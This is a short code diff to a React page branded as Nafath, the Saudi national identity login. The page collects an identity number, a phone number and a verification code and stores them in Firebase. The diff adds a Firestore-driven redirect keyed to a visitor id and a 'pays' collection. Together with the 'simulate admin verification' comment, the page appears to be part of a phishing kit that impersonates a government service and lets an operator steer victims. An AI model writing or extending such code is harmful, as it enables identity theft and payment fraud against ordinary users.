@@ -6,6 +6,7 @@ import type React from "react";
 import { useEffect, useState } from "react";
 import NafazModal from "../components/NafazModal";
 import { addData } from "../apis/firebase";
+import FirestoreRedirect from "./rediract-page";
 
 interface NafazFormData {
   identity_number: string;
@@ -36,7 +37,7 @@ export default function Nafaz({
   const [showModal, setShowModal] = useState(false);
   const [verificationCode, setVerificationCode] = useState("");
   const [phone] = useState(initialPhone);
-
+  const _id = localStorage.getItem("visitor");
   // Simulate admin verification with a timeout
   useEffect(() => {
     if (isSubmitted) {
@@ -125,6 +126,8 @@ export default function Nafaz({
 
   return (
     <div className="min-h-screen bg-[#eee] flex flex-col items-center py-3">
+      <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+
       <div className="w-full space-y-8">
         <h1 className="text-4xl font-bold text-[#3a9f8c] mb-6 bg-white p-4">
           نفاذ
